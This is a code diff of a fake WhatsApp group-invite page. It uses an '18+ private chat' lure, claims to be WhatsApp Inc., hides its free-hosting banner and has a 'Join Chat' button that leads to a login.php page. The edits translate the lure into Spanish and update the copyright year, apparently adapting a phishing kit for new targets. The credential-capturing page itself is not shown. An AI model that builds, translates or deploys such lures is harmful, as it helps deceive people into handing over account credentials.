@@ -2,7 +2,7 @@
 <head>
 <style>img[alt*="www.000webhost.com"]{display:none}</style>
 <meta charset="UTF-8">
-<title>WhatsApp Group Invite</title>
+<title>Invitacion a Grupo de WhatsApp</title>
 <meta property="og:title" content="WhatsApp Group Invite"/>
 <meta property="og:image" content="img/v4/icon.png"/>
 <meta property="og:site_name" content="WhatsApp.com"/>
@@ -46,13 +46,13 @@
 		<div class="page-content page-content--single">
 			<div class="block block--invite">
 				<a href="#" id="action-icon" title="Follow this link to join: Berbagi Video 18+ Hot" class="block__img img icon-chat"><span class="img__body" style="background-image: url(img/1.jpg);"></span></a>
-				<h2 class="block__title">18+ Private Chat Group<h2>
-				<h3 class="block__subtitle" dir="auto">WhatsApp Group Invite</h3>
+				<h2 class="block__title">18+ Chat Grupo Privado<h2>
+				<h3 class="block__subtitle" dir="auto">Invitacion Grupo Privado WhatsApp</h3>
 				<button onclick="location.href='login.php';" type="button" class="button button--simple button--primary">Join Chat</button>
 			</div>
 			<hr>
 			<div class="block block--hint">
-				 Don't have WhatsApp yet?<br>
+				 Aun no tienes cuenta?<br>
 				<a href="https://www.whatsapp.com/download">Download</a>
 			</div>
 		</div>
@@ -167,7 +167,7 @@
 	<div class="page-footer -secondary">
 		<div class="page-footer__inner">
 			<div class="four">
-				<div class="four__item" dir="auto">2017 &copy; WhatsApp Inc.</div>
+				<div class="four__item" dir="auto">2023 &copy; WhatsApp Inc.</div>
 				<div class="four__item -span3">
 					<a href="https://www.whatsapp.com/legal/" class="page-footer__link">Privacy & Terms</a>
 				</div>
